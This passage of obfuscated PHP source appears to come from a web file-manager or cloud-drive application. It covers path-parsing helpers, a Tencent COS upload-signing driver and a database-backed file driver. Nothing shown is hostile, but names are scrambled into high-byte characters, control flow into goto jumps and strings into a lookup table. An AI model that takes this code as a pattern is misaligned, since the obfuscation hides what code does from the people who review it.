$E÷œã¨ÒŒ)) { $e‰šæÈ“ë¬[$E¡´‚åÅ©’[1053]] = $d³ùĞ‡™˜‡[1]; $e‰šæÈ“ë¬[$E¡´‚åÅ©’[29]] = $D»Ù³¤˜Ìº; $e‰šæÈ“ë¬[$E¡´‚åÅ©’[1145]] = substr($D»Ù³¤˜Ìº, 1, -1); $e‰šæÈ“ë¬[$E¡´‚åÅ©’[392]] = $d³ùĞ‡™˜‡[3]; } $e‰šæÈ“ë¬[$E¡´‚åÅ©’[1052]] = $d³ùĞ‡™˜‡[4]; } goto A¸ïğäÊ‚; A¸ïğäÊ‚: $bÇ·î·İÔ­ = array($E¡´‚åÅ©’[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $e‰šæÈ“ë¬[$E¡´‚åÅ©’[1108]] = in_array($e‰šæÈ“ë¬[$E¡´‚åÅ©’[29]], $bÇ·î·İÔ­); return $e‰šæÈ“ë¬; goto b¡ÔÁ–—»ó; FùŠªæ‘é¯: $E¡´‚åÅ©’ =& $_SERVER[Šº]; $cØ˜¾æ¶ùµ = self::clear($cØ˜¾æ¶ùµ); $E÷œã¨ÒŒ = array_values(self::typeList()); goto DÈù‹¥‘Ä; b¡ÔÁ–—»ó: } public static function isTruePath($E›ºóŠ°ÒÒ) { goto f¾±©Â–é; f¾±©Â–é: $e„‘¢¿Í¯² =& $_SERVER[Šº]; if (substr($E›ºóŠ°ÒÒ, 0, 1) != $e„‘¢¿Í¯²[1144]) { return !0; } if (strpos($E›ºóŠ°ÒÒ, $e„‘¢¿Í¯²[408]) === 0) { return !0; } goto Fî¹¼ÌáŒ; Fî¹¼ÌáŒ: if (strpos($E›ºóŠ°ÒÒ, $e„‘¢¿Í¯²[1111]) === 0) { return !0; } if (strpos($E›ºóŠ°ÒÒ, $e„‘¢¿Í¯²[1146]) === 0) { return !0; } if (strpos($E›ºóŠ°ÒÒ, $e„‘¢¿Í¯²[1146]) === 0) { return !0; } goto eª—óñ„‹´; eª—óñ„‹´: if (strpos($E›ºóŠ°ÒÒ, $e„‘¢¿Í¯²[1147]) === 0) { return !0; } return !1; goto B³§Šºšßõ; B³§Šºšßõ: } public static function clear($B±°«¨‰ã) { goto e–À’Åƒ‹·; D†Êâñƒï: $eÄ’ôÃÙİ = $DŒŒ ¨ôÇ«[1148]; if (substr($B±°«¨‰ã, 0, 3) == $DŒŒ ¨ôÇ«[1149]) { $B±°«¨‰ã = substr($B±°«¨‰ã, 3); } while (strstr($B±°«¨‰ã, $eÄ’ôÃÙİ)) { $B±°«¨‰ã = str_replace($eÄ’ôÃÙİ, $DŒŒ ¨ôÇ«[8], $B±°«¨‰ã); } goto cÒÅÌËÒóÕ; f‡Æ¹£¹Ú: return $B±°«¨‰ã; goto dä¹ÑÃ¢¢ƒ; e–À’Åƒ‹·: $DŒŒ ¨ôÇ« =& $_SERVER[Šº]; $B±°«¨‰ã = str_replace(array($DŒŒ ¨ôÇ«[1026], $DŒŒ ¨ôÇ«[228]), $DŒŒ ¨ôÇ«[50], $B±°«¨‰ã); $B±°«¨‰ã = str_replace($DŒŒ ¨ôÇ«[97], $DŒŒ ¨ôÇ«[8], $B±°«¨‰ã); goto D†Êâñƒï; cÒÅÌËÒóÕ: $B±°«¨‰ã = preg_replace($DŒŒ ¨ôÇ«[1150], $DŒŒ ¨ôÇ«[8], $B±°«¨‰ã); if ($B±°«¨‰ã == $DŒŒ ¨ôÇ«[8]) { return $DŒŒ ¨ôÇ«[8]; } $B±°«¨‰ã = rtrim($B±°«¨‰ã, $DŒŒ ¨ôÇ«[8]); goto f‡Æ¹£¹Ú; dä¹ÑÃ¢¢ƒ: } public static function sourceID($e²÷†¦ÓÈè) { $C›ùĞÁ“Ü =& $_SERVER[Šº]; $aâ ÏÕÎÂ¢ = self::parse($e²÷†¦ÓÈè); if ($aâ ÏÕÎÂ¢[$C›ùĞÁ“Ü[29]] !== self::KOD_SOURCE) { show_json(LNG($C›ùĞÁ“Ü[1151]), !1); } return $aâ ÏÕÎÂ¢[$C›ùĞÁ“Ü[392]]; } public static function make($f‘Ò¥¯‘¦ã) { if (!$f‘Ò¥¯‘¦ã) { return !1; } return self::makePath(self::KOD_SOURCE, intval($f‘Ò¥¯‘¦ã)); } public static function makeShare($Aõ‡ã‰îÓ«, $F†ÎÖãÆí’) { return self::makePath(self::KOD_SHARE_ITEM, $Aõ‡ã‰îÓ«, $F†ÎÖãÆí’); } public static function makeFileTypePath($aóÚ³ŞÙ÷Å) { return self::makePath(self::KOD_USER_FILE_TYPE, $aóÚ³ŞÙ÷Å); } public static function makeFileTagPath($eù›ŒÃÔŞ¶) { return self::makePath(self::KOD_USER_FILE_TAG, $eù›ŒÃÔŞ¶); } public static function makePath($DĞ…¡æÜæ, $F‚Ä‹À‡ªØ = '', $c¤¹Ó½—ø = '') { $bÚ¬·•äÍ =& $_SERVER[Šº]; $F‹¡¢Ëœ´Ğ = substr($DĞ…¡æÜæ, 1, -1); $C¢ä›‚Ì¼İ = $bÚ¬·•äÍ[1152] . $F‹¡¢Ëœ´Ğ . $bÚ¬·•äÍ[1153] . $F‚Ä‹À‡ªØ . $bÚ¬·•äÍ[1154]; $C¢ä›‚Ì¼İ = $c¤¹Ó½—ø ? $C¢ä›‚Ì¼İ . $c¤¹Ó½—ø . $bÚ¬·•äÍ[8] : $C¢ä›‚Ì¼İ; return $C¢ä›‚Ì¼İ; } public static function hashPath($cÅŒÜùä¢Ë, $DÓø’ÄÉ = true) { goto DÛ§±í‘ê’; c£Ü’½·áÔ: if (!$FØ«¿—©÷ï && isset($Dù’¸µ°Ü–[$CøùÆ¼”Ù½[403]])) { $Dù’¸µ°Ü– = IO::info(KodIO::make($Dù’¸µ°Ü–[$CøùÆ¼”Ù½[403]])); $FØ«¿—©÷ï = _get($Dù’¸µ°Ü–, $CøùÆ¼”Ù½[1155], $CøùÆ¼”Ù½[33]); } if (!$FØ«¿—©÷ï && $DÓø’ÄÉ) { $C¼²ÏÑå†¯ = KodIO::parse($Dù’¸µ°Ü–[$CøùÆ¼”Ù½[76]]); if (!$C¼²ÏÑå†¯[$CøùÆ¼”Ù½[29]]) { $FØ«¿—©÷ï = IO::hashSimple($Dù’¸µ°Ü–[$CøùÆ¼”Ù½[76]]); } } if (!$FØ«¿—©÷ï) { $FØ«¿—©÷ï = md5($Dù’¸µ°Ü–[$CøùÆ¼”Ù½[76]] . $Dù’¸µ°Ü–[$CøùÆ¼”Ù½[78]] . $Dù’¸µ°Ü–[$CøùÆ¼”Ù½[84]]); } goto DÉÍ‰±—; DÉÍ‰±—: return $FØ«¿—©÷ï; goto A©™õ½ˆĞ; DÛ§±í‘ê’: $CøùÆ¼”Ù½ =& $_SERVER[Šº]; $Dù’¸µ°Ü– = is_array($cÅŒÜùä¢Ë) ? $cÅŒÜùä¢Ë : IO::info($cÅŒÜùä¢Ë); $FØ«¿—©÷ï = _get($Dù’¸µ°Ü–, $CøùÆ¼”Ù½[1155], $CøùÆ¼”Ù½[33]); goto c£Ü’½·áÔ; A©™õ½ˆĞ: } public static function initSystemPath() { goto b†‹Œ††å¹; b†‹Œ††å¹: $A­ÆÆŠ¶ôË =& $_SERVER[Šº]; if (defined($A­ÆÆŠ¶ôË[1156])) { return; } define($A­ÆÆŠ¶ôË[1156], self::systemPath($A­ÆÆŠ¶ôË[1157])); goto DÉ˜›Ä ; DÉ˜›Ä : define($A­ÆÆŠ¶ôË[1158], self::systemPath($A­ÆÆŠ¶ôË[1159])); define($A­ÆÆŠ¶ôË[1160], self::systemPath($A­ÆÆŠ¶ôË[1161])); define($A­ÆÆŠ¶ôË[1162], self::systemPath($A­ÆÆŠ¶ôË[1163])); goto E‚Ÿã¯ƒ©ô; E‚Ÿã¯ƒ©ô: IOHistory::bindEvent(); goto F¼‚²Àˆ¯; F¼‚²Àˆ¯: } public static function systemPath($C¯¾©Ã¿¸) { goto c¼ ¾„¾Ö; EÃÛ‰ÇÛ…: return $dĞê’Û×ĞØ; goto C—¸ÊÊÁÆœ; cˆ¸”Õ¥°¼: if ($dĞê’Û×ĞØ) { return $dĞê’Û×ĞØ; } if ($C¯¾©Ã¿¸ == $EÛêòÎÂ¢[1157]) { $dĞê’Û×ĞØ = self::make(Model($EÛêòÎÂ¢[788])->systemRootPathAdd($EÛêòÎÂ¢[513])); } else { $dĞê’Û×ĞØ = self::systemPath($EÛêòÎÂ¢[1157]); $FŠ¹µ…Ô÷¿ = self::sourceID($dĞê’Û×ĞØ); $dĞê’Û×ĞØ = self::make(Model($EÛêòÎÂ¢[788])->mkdir($FŠ¹µ…Ô÷¿, $C¯¾©Ã¿¸)); } Model($EÛêòÎÂ¢[728])->set($cšÃ§Í, $dĞê’Û×ĞØ); goto EÃÛ‰ÇÛ…; c¼ ¾„¾Ö: $EÛêòÎÂ¢ =& $_SERVER[Šº]; $cšÃ§Í = $EÛêòÎÂ¢[1164] . ucfirst($C¯¾©Ã¿¸); $dĞê’Û×ĞØ = Model($EÛêòÎÂ¢[728])->get($cšÃ§Í); goto cˆ¸”Õ¥°¼; C—¸ÊÊÁÆœ: } public static function systemFolder($DßÛ¾è») { $dèÌÕ÷Ûèõ = IO_PATH_SYSTEM_SOURCE . $DßÛ¾è»; $C¥œâ£¼ÎÅ = Cache::get($dèÌÕ÷Ûèõ); if (!$C¥œâ£¼ÎÅ) { $FØÛ™ëÛ¿Ú = IO::infoFull($dèÌÕ÷Ûèõ); if (!$FØÛ™ëÛ¿Ú) { $C¥œâ£¼ÎÅ = IO::mkdir($dèÌÕ÷Ûèõ, REPEAT_SKIP); } else { $C¥œâ£¼ÎÅ = $FØÛ™ëÛ¿Ú[$_SERVER[Šº][76]]; } Cache::set($dèÌÕ÷Ûèõ, $C¥œâ£¼ÎÅ, 3600 * 10); } return $C¥œâ£¼ÎÅ; } public static function defaultDriver() { return Model($_SERVER[Šº][725])->defaultDriver(); } public static function defaultIO() { $B˜ÓæÉ¬ƒ® =& $_SERVER[Šº]; $d’¾“ìÆİ° = self::defaultDriver(); return $B˜ÓæÉ¬ƒ®[1165] . $d’¾“ìÆİ°[$B˜ÓæÉ¬ƒ®[392]] . $B˜ÓæÉ¬ƒ®[1154]; } public static function defaultDriverInit() { static $D—Ì‰Ø¾œ = false; if ($D—Ì‰Ø¾œ) { return $D—Ì‰Ø¾œ; } $D—Ì‰Ø¾œ = IO::init(self::defaultIO()); return $D—Ì‰Ø¾œ; } public static function fileTypeList() { $BŒ’ß¯˜‘È =& $_SERVER[Šº]; $DÏË´”ÂŠš = $GLOBALS[$BŒ’ß¯˜‘È[6]][$BŒ’ß¯˜‘È[1166]]; foreach ($DÏË´”ÂŠš as $aå±­Óßñ­ => $EêÀõÑˆ¯Ğ) { $dÜ–²”»¤­ = $BŒ’ß¯˜‘È[1167] . $aå±­Óßñ­; $cßË’ñ¤ßÖ = LNG($dÜ–²”»¤­); if ($dÜ–²”»¤­ != $cßË’ñ¤ßÖ) { $DÏË´”ÂŠš[$aå±­Óßñ­][$BŒ’ß¯˜‘È[28]] = $cßË’ñ¤ßÖ; } } return $DÏË´”ÂŠš; } public static function transferType($F”àó•ğîÉ, $C“ŞªèğÑÈ) { goto DÙÂëğ›—Ÿ; D–Û¤¶›½¢: if ($CŸ¤ßöºù[$cö­à¸‘å[29]] == $A¬ÒÛ¼Ìƒê[$cö­à¸‘å[29]] && $CŸ¤ßöºù[$cö­à¸‘å[1168]] == $A¬ÒÛ¼Ìƒê[$cö­à¸‘å[1168]]) { return $cö­à¸‘å[1169]; } if ($CŸ¤ßöºù[$cö­à¸‘å[29]] == $cö­à¸‘å[821] && $A¬ÒÛ¼Ìƒê[$cö­à¸‘å[29]] == $cö­à¸‘å[106]) { return $cö­à¸‘å[1082]; } if ($CŸ¤ßöºù[$cö­à¸‘å[29]] == $cö­à¸‘å[106] && $A¬ÒÛ¼Ìƒê[$cö­à¸‘å[29]] == $cö­à¸‘å[821]) { return $cö­à¸‘å[107]; } goto dâ‚Ó¡¼´; DÙÂëğ›—Ÿ: $cö­à¸‘å =& $_SERVER[Šº]; $CŸ¤ßöºù = self::driverType($F”àó•ğîÉ); $A¬ÒÛ¼Ìƒê = self::driverType($C“ŞªèğÑÈ); goto D–Û¤¶›½¢; dâ‚Ó¡¼´: return $cö­à¸‘å[1170]; goto Dø«§÷Ö¨×; Dø«§÷Ö¨×: } public static function driverType($Dµ«æƒïË÷) { goto fï«…ä¡ó; B‰Àš¶º‘¶: if ($C„™¿¿Ò— == $dÓ¿˜®‚‹[716] || $C„™¿¿Ò— == $dÓ¿˜®‚‹[1172] || $C„™¿¿Ò— == $dÓ¿˜®‚‹[1173]) { $Dµ«æƒïË÷ = self::defaultDriverInit(); } else { if ($C„™¿¿Ò— == $dÓ¿˜®‚‹[1089] || $C„™¿¿Ò— == $dÓ¿˜®‚‹[1174]) { $Dµ«æƒïË÷ = IO::init($Dµ«æƒïË÷->pathParse[$dÓ¿˜®‚‹[1036]]); } } $C„™¿¿Ò— = str_replace($dÓ¿˜®‚‹[1171], $dÓ¿˜®‚‹[33], strtolower($Dµ«æƒïË÷->getType())); if ($C„™¿¿Ò— == $dÓ¿˜®‚‹[106]) { return array($dÓ¿˜®‚‹[29] => $dÓ¿˜®‚‹[106], $dÓ¿˜®‚‹[1168] => $dÓ¿˜®‚‹[33], $dÓ¿˜®‚‹[76] => $A‹¾ÕÎ©Â); } goto DöÆÁĞ±—; fï«…ä¡ó: $dÓ¿˜®‚‹ =& $_SERVER[Šº]; $A‹¾ÕÎ©Â = $Dµ«æƒïË÷->path; $C„™¿¿Ò— = str_replace($dÓ¿˜®‚‹[1171], $dÓ¿˜®‚‹[33], strtolower($Dµ«æƒïË÷->getType())); goto B‰Àš¶º‘¶; DöÆÁĞ±—: return array($dÓ¿˜®‚‹[29] => $dÓ¿˜®‚‹[821], $dÓ¿˜®‚‹[1168] => $Dµ«æƒïË÷->pathDriver, $dÓ¿˜®‚‹[76] => $A‹¾ÕÎ©Â); goto då¹çã˜; då¹çã˜: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Då°‡¢»š¦) { parent::__construct($Då°‡¢»š¦); $this->signatureVersion($_SERVER[Šº][211]); } public function uploadFormData($Eß¡ê‰¤”Â, $aË™Ğ‘“ïÄ = 3600) { goto b¨¡Ã†ˆ¹‚; DÄñ±Ë¹ã: $F‡±©­‚ßõ = $döƒ¯±øİ½[1175]; $e•¼¥„»­â = gmdate($döƒ¯±øİ½[1176], time() + $aË™Ğ‘“ïÄ); $FÊôøœéÅ— = (string) time() . $döƒ¯±øİ½[68] . (string) (time() + $aË™Ğ‘“ïÄ); goto CåŒº¬±ĞŸ; CåŒº¬±ĞŸ: $B„Û‘ï®Êâ = array($döƒ¯±øİ½[1177] => $e•¼¥„»­â, $döƒ¯±øİ½[1178] => array(array($döƒ¯±øİ½[1179] => $d÷®ãŒšº), array($döƒ¯±øİ½[1180] => $this->bucket), array($döƒ¯±øİ½[1181], $döƒ¯±øİ½[1182], $döƒ¯±øİ½[33]), array($döƒ¯±øİ½[1183] => $F‡±©­‚ßõ), array($döƒ¯±øİ½[1184] => $FÑ¡íä›Íñ), array($döƒ¯±øİ½[1185] => $this->accessKey), array($döƒ¯±øİ½[1186] => $FÊôøœéÅ—))); $B„Û‘ï®Êâ = json_encode($B„Û‘ï®Êâ); $Fˆµİæê•À = hash_hmac($döƒ¯±øİ½[229], $FÊôøœéÅ—, $this->secret); goto c¸Š‚´ÕÙè; b½Àî¿õ‰º: return $Aã»œ›çí”; goto A»ˆ‹ğ¬œì; c¸Š‚´ÕÙè: $EÃõ¿¸·£ = sha1($B„Û‘ï®Êâ); $CÎ¯À½¾ÌÅ = hash_hmac($döƒ¯±øİ½[229], $EÃõ¿¸·£, $Fˆµİæê•À); $Aã»œ›çí” = array($döƒ¯±øİ½[1179] => $d÷®ãŒšº, $döƒ¯±øİ½[1183] => $F‡±©­‚ßõ, $döƒ¯±øİ½[1187] => base64_encode($B„Û‘ï®Êâ), $döƒ¯±øİ½[1184] => $FÑ¡íä›Íñ, $döƒ¯±øİ½[1185] => $this->accessKey, $döƒ¯±øİ½[1188] => $FÊôøœéÅ—, $döƒ¯±øİ½[1189] => $CÎ¯À½¾ÌÅ, $döƒ¯±øİ½[175] => $this->getHost()); goto b½Àî¿õ‰º; b¨¡Ã†ˆ¹‚: $döƒ¯±øİ½ =& $_SERVER[Šº]; $d÷®ãŒšº = $döƒ¯±øİ½[191]; $FÑ¡íä›Íñ = $döƒ¯±øİ½[229]; goto DÄñ±Ë¹ã; A»ˆ‹ğ¬œì: } public function fileOutLink($F¤—ğŠ¡æ”) { $aîô®ğÍÂÆ =& $_SERVER[Šº]; if (substr($F¤—ğŠ¡æ”, 0, 7) == $aîô®ğÍÂÆ[1190]) { $F¤—ğŠ¡æ” = $aîô®ğÍÂÆ[1191] . substr($F¤—ğŠ¡æ”, 7); } header($aîô®ğÍÂÆ[159] . $F¤—ğŠ¡æ”); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($c¨†§ÅÓÀ†) { $this->pathParse = $c¨†§ÅÓÀ†; $this->model = Model($_SERVER[Šº][1192]); } public function getPath($D‡ŒÛƒŸöÎ) { return trim($D‡ŒÛƒŸöÎ, $_SERVER[Šº][8]); } public function pathFather($BÖ®¼ÔÀ‘ß) { $F®Æ…¤¼»‰ = $this->parse($BÖ®¼ÔÀ‘ß); $F®Æ…¤¼»‰ = $this->infoSimple($BÖ®¼ÔÀ‘ß); return $F®Æ…¤¼»‰ ? $F®Æ…¤¼»‰[$_SERVER[Šº][485]] : !1; } public function pathThis($B™³Â‡•) { $aÁà„­Œ = $this->infoSimple($B™³Â‡•); return $aÁà„­Œ ? $aÁà„­Œ[$_SERVER[Šº][28]] : !1; } public function getPathOuter($däÉ¹Ã‰÷Œ) { if (!$däÉ¹Ã‰÷Œ) { return $däÉ¹Ã‰÷Œ; } $b–¢Æº™‹ = $this->parse($däÉ¹Ã‰÷Œ); return KodIO::make($b–¢Æº™‹[$_SERVER[Šº][392]]); } public function copyFolderFromIO($b™ğè‡ôğ—, $cê³ö¶‘ìµ, $eÇ»ÚäÛÚ·, $b »Å°í”·, $B² ©Ô¼îç) { $f³ñõ¼· = $this->model->copyFolderFromIO($b™ğè‡ôğ—, $cê³ö¶‘ìµ, $eÇ»ÚäÛÚ·, $b »Å°í”·, $B² ©Ô¼îç); return KodIO::make($f³ñõ¼·); } public function isParentOf($cÅß¬àïÚì, $aˆğ³íÕ) { return $this->model->isParentOf($cÅß¬àïÚì, $aˆğ³íÕ); } public function mkfile($B„¶ƒß›ÚÆ, $cÎ©ù®ÉÔÓ = '', $a„¼Ì¾È‚Á = REPEAT_RENAME) { $A·‡¦¹–ôÀ =& $_SERVER[Šº]; $dİ ‰ªæß = $this->parse($B„¶ƒß›ÚÆ); $B„¶ƒß›ÚÆ = $dİ ‰ªæß[$A·‡¦¹–ôÀ[392]]; for ($c½¨“¾Ñº‚ = 0; $c½¨“¾Ñº‚ < count($dİ ‰ªæß[$A·‡¦¹–ôÀ[1193]]); $c½¨“¾Ñº‚++) { $eöôìÉ´Å = $dİ ‰ªæß[$A·‡¦¹–ôÀ[1193]][$c½¨“¾Ñº‚]; if ($c½¨“¾Ñº‚ == count($dİ ‰ªæß[$A·‡¦¹–ôÀ[1193]]) - 1) { $B„¶ƒß›ÚÆ = $this->model->mkfile($B„¶ƒß›ÚÆ, $eöôìÉ´Å, $cÎ©ù®ÉÔÓ, $a„¼Ì¾È‚Á); break; } $B„¶ƒß›ÚÆ = $this->model->mkdir($B„¶ƒß›ÚÆ, $eöôìÉ´Å, REPEAT_SKIP); } return $this->getPathOuter($B„¶ƒß›ÚÆ); } public function mkdir($bÎØå£ã²Ã, $aºµŸ‘÷ÕÀ = REPEAT_SKIP) { $CèÆ‡÷©ğ =& $_SERVER[Šº]; $bÄ¡¤ƒ¿”ã = $this->parse($bÎØå£ã²Ã); $bÎØå£ã²Ã = $bÄ¡¤ƒ¿”ã[$CèÆ‡÷©ğ[392]]; for ($eœÈƒóØ¾ = 0; $eœÈƒóØ¾ < count($bÄ¡¤ƒ¿”ã[$CèÆ‡÷©ğ[1193]]); $eœÈƒóØ¾++) { $f„ÎÉßá’¹ = $bÄ¡¤ƒ¿”ã[$CèÆ‡÷©ğ[1193]][$eœÈƒóØ¾]; $bÎØå£ã²Ã = $this->model->mkdir($bÎØå£ã²Ã, $f„ÎÉßá’¹, $aºµŸ‘÷ÕÀ); } return $this->getPathOuter($bÎØå£ã²Ã); } public function copyFile($bßâ”õÖØ, $BİäÊ‹Â¥ñ, $c™ËĞÆ÷ªŒ = REPEAT_REPLACE) { $e®ƒ£‹‘ßÇ =& $_SERVER[Šº]; $FÊ®ª”ô• = $this->parse($BİäÊ‹Â¥ñ); $e”­µ¹óÚ• = $this->model->copy($bßâ”õÖØ, $FÊ®ª”ô•[$e®ƒ£‹‘ßÇ[392]], $c™ËĞÆ÷ªŒ, $FÊ®ª”ô•[$e®ƒ£‹‘ßÇ[76]]); return $e”­µ¹óÚ• ? $this->getPathOuter($e”­µ¹óÚ•) : !1; } public function moveFile($Dµ©ÊšÙ‡, $F’¾ÕÏË·¨, $C»ê¯¿ò· = REPEAT_REPLACE) { $cŞÀ¨ßÓ¥ =& $_SERVER[Šº]; $a›ñÍùÓ¢Õ = $this->parse($F’¾ÕÏË·¨); $EĞË¯Óôæ = $this->model->move($Dµ©ÊšÙ‡, $a›ñÍùÓ¢Õ[$cŞÀ¨ßÓ¥[392]], $C»ê¯¿ò·, $a›ñÍùÓ¢Õ[$cŞÀ¨ßÓ¥[76]]); return $EĞË¯Óôæ ? $this->getPathOuter($EĞË¯Óôæ) : !1; } public function copy($ašÔê‘•‘ò, $c¥ØçŠËî , $føÎñ«µ¦ñ = REPEAT_REPLACE) { $fÃâÅòÛ¼“ = $this->parse($c¥ØçŠËî ); $eˆ¨Á÷ß = $this->model->copy($ašÔê‘•‘ò, $fÃâÅòÛ¼“[$_SERVER[Šº][392]], $føÎñ«µ¦ñ); return $eˆ¨Á÷ß ? $this->getPathOuter($eˆ¨Á÷ß) : !1; } public function moveSameAllow() { } public function move($b‰ßâôßù, $fíÎÄ¥´éÃ, $E‚†£ŠÎï‰ = REPEAT_REPLACE) { $c¡Ô®áÂºÀ = $this->parse($fíÎÄ¥´éÃ); $cÔ©‰ç›¬ø = $this->model->move($b‰ßâôßù, $c¡Ô®áÂºÀ[$_SERVER[Šº][392]], $E‚†£ŠÎï‰); return $cÔ©‰ç›¬ø ? $this->getPathOuter($cÔ©‰ç›¬ø) : !1; } public function remove($A’ëíæ½•, $E·®×¹Ëóö = true) { return $this->model->remove($A’ëíæ½•, $E·®×¹Ëóö); } public function rename($d—Æó‡Š“, $aŒŠ‚Æãø) { $c‹Š“„ÔÜ¶ = $this->model->rename($d—Æó‡Š“, $aŒŠ‚Æãø); return $c‹Š“„ÔÜ¶ ? $this->getPathOuter($d—Æó‡Š“) : $c‹Š“„ÔÜ¶; } public function size($F³ò¢ğïŸ) { $eç¡àô¹íç = $this->infoSimple($F³ò¢ğïŸ); return $eç¡àô¹íç ? $eç¡àô¹íç[$_SERVER[Šº][78]] : 0; } public function infoSimple($B‚Í¹ììŞ²) { return $this->model->sourceInfo($B‚Í¹ììŞ²); } public function info($EØ—£“œÓÀ) { return $this->infoParse($EØ—£“œÓÀ); } public function infoAuth($CÉ„‰—Ğ©) { return $this->infoParse($CÉ„‰—Ğ©, !1, !0); } public function infoWithChildren($d£è•À²Ë) { return $this->infoParse($d£è•À²Ë, !0); } protected function infoParse($cÖ£Ù„í¸, $F¢Ùì§¤ïç = false, $B¬Ğ³½õ• = false) { if (!$F¢Ùì§¤ïç) { return $this->model->pathInfo($cÖ£Ù„í¸, $B¬Ğ³½õ•); } return $this->model->pathInfoMore($cÖ£Ù„í¸); } public function infoFull($bÇ‘ÊŞÌ) { $eÛ²êÑøè =& $_SERVER[Šº]; $e ˆï»‚ = explode($eÛ²êÑøè[8], $bÇ‘ÊŞÌ); $DÁƒªÏ×˜ß = implode($eÛ²êÑøè[8], array_splice($e ˆï»‚, 1)); return $this->model->pathInfoByPath($e ˆï»‚[0], $DÁƒªÏ×˜ß); } public function hashSimple($C’¨Â“ÒÅŒ) { $eàïÂ«Š¼ =& $_SERVER[Šº]; $Dëˆ¶Êí–« = $this->infoWithChildren($C’¨Â“ÒÅŒ); return $Dëˆ¶Êí–«[$eàïÂ«Š¼[164]][$eàïÂ«Š¼[171]]; } public function hashMd5($A…²Ÿ·É¨) { $fµÇÁ­‹Á÷ =& $_SERVER[Šº]; $aÂ­¨ğÕØ = $this->infoWithChildren($A…²Ÿ·É¨); return $aÂ­¨ğÕØ[$fµÇÁ­‹Á÷[164]][$fµÇÁ­‹Á÷[170]]; } public function exist($e„ùîš¤Óª) { $E¾‚º•Ë =& $_SERVER[Šº]; $B˜¹ñ®×™œ = $this->parse($e„ùîš¤Óª); if (!$B˜¹ñ®×™œ[$E¾‚º•Ë[76]]) { return $this->isFile($e„ùîš¤Óª) || $this->isFolder($e„ùîš¤Óª); } $Eòº‘Ó†‹ê = array($E¾‚º•Ë[402] => $B˜¹ñ®×™œ[$E¾‚º•Ë[392]], $E¾‚º•Ë[28] => $B˜¹ñ®×™œ[$E¾‚º•Ë[76]]); $F•æ¾²Ë¥‚ = $this->model->where($Eòº‘Ó†‹ê)->find(); return $F•æ¾²Ë¥‚ ? !0 : !1; } public function isFile($c²Ì¿Êí‘ì) { $C­ßğ‰ŒÁÀ =& $_SERVER[Šº]; $eòó¹ãô‡Â = $this->infoSimple($c²Ì¿Êí‘ì); return $eòó¹ãô‡Â && $eòó¹ãô‡Â[$C­ßğ‰ŒÁÀ[410]] == $C­ßğ‰ŒÁÀ[87] ? !1 : !0; } public function isFolder($F¶†„“ò“) { $f¬Ş¡Ëáöè =& $_SERVER[Šº]; $fô¥æíñ’‡ = $this->infoSimple($F¶†„“ò“); return $fô¥æíñ’‡ && $fô¥æíñ’‡[$f¬Ş¡Ëáöè[410]] == $f¬Ş¡Ëáöè[87] ? !0 : !1; } public function listPath($cíÚ•Š, $dŞäˆ£ÂĞğ = false) { $eäÃÊ«¼İÈ =& $_SERVER[Šº]; if ($cíÚ•Š == $eäÃÊ«¼İÈ[33]) { return !1; } $A¾ÎŒÔ¸‡— = array($eäÃÊ«¼İÈ[402] => $cíÚ•Š); if ($dŞäˆ£ÂĞğ) { return $this->model->listSource($A¾ÎŒÔ¸‡—, -1); } return $this->model->listSource($A¾ÎŒÔ¸‡—); } public function has($dë¥Š®½Š, $D•÷Õ‡‰»â = false, $cñÉôÙ óè = null) { $f‰Ïñ‹§æ =& $_SERVER[Šº]; $aˆï¯Úˆ×¾ = $this->infoWithChildren($dë¥Š®½Š); if ($D•÷Õ‡‰»â) { return array($f‰Ïñ‹§æ[203] => $aˆï¯Úˆ×¾[$f‰Ïñ‹§æ[203]], $f‰Ïñ‹§æ[202] => $aˆï¯Úˆ×¾[$f‰Ïñ‹§æ[202]]); } return $cñÉôÙ óè ? $aˆï¯Úˆ×¾[$f‰Ïñ‹§æ[203]] : $aˆï¯Úˆ×¾[$f‰Ïñ‹§æ[202]]; } public function listAll($eà‘öòÍÀ×) { $bŠƒåâèÀ = IO::info($this->pathParse[$_SERVER[Šº][76]]); if (!$bŠƒåâèÀ) { return array(); } return $this->model->listAll($eà‘öòÍÀ×); } public function getContent($A¥’ß×Ø÷) { return $this->model->getContent($A¥’ß×Ø÷); } public function setContent($BŞ®ÅŠ˜òÁ, $c…İô½”Ñ = '') { return $this->model->setContent($BŞ®ÅŠ˜òÁ, $c…İô½”Ñ); } public function fileSubstr($aÎ¶îŒ³µ‚, $Ağò®Œµ¼˜, $BÕ“Çîˆ¢) { return $this->model->fileSubstr($aÎ¶îŒ³µ‚, $Ağò®Œµ¼˜, $BÕ“Çîˆ¢); } public function download($céŒáÊ·å, $dèÀåë¥Ô = '') { $dµ¬ÂÄšç” = get_path_father($dèÀåë¥Ô); $dÙãÜíØ“Ï = get_path_this($dèÀåë¥Ô); $Eİ¯òŞ = $this->model->fileInfoGet($céŒáÊ·å); $cøÕ Õ³ = IO::copy($Eİ¯òŞ[$_SERVER[Šº][76]], $dµ¬ÂÄšç”, !1, $dÙãÜíØ“Ï); return $cøÕ Õ³; } public function setModifyTime($fø—…İ“ “, $e­Äßö„ ¥ = '') { $Eğ†Áèµ¨¨ =& $_SERVER[Šº]; if (!$fø—…İ“ “) { return; } $this->model->where(array($Eğ†Áèµ¨¨[417] => $fø—…İ“ “))->save(array($Eğ†Áèµ¨¨[84] => $e­Äßö„ ¥)); } public function upload($C³Ê‹ˆø, $A·§æÓŸƒ’, $D›†íÎÑ¦ß = false, $dß´Æ²•‡¥ = REPEAT_REPLACE) { $E¢óÓŠ½ª =& $_SERVER[Šº]; $aÅÄô‹Ášï = $this->parse($C³Ê‹ˆø); $AÉ§±ïÊŸ = $this->model->addFile($aÅÄô‹Ášï[$E¢óÓŠ½ª[392]], $A·§æÓŸƒ’, $aÅÄô‹Ášï[$E¢óÓŠ½ª[76]], $D›†íÎÑ¦ß, $dß´Æ²•‡¥); return $this->getPathOuter($AÉ§±ïÊŸ); } public function uploadFileByID($c–Ğê¤ãà—, $dİ¡ô„Õå, $aå½Äğ›¥) { $c¿ŠÇ“‹‰ß =& $_SERVER[Šº]; $a÷££‚„ = $this->parse($c–Ğê¤ãà—); $bÃÁ’ì—„¿ = $this->model->addFileByFileID($a÷££‚„[$c¿ŠÇ“‹‰ß[392]], $dİ¡ô„Õå, $a÷££‚„[$c¿ŠÇ“‹‰ß[76]], 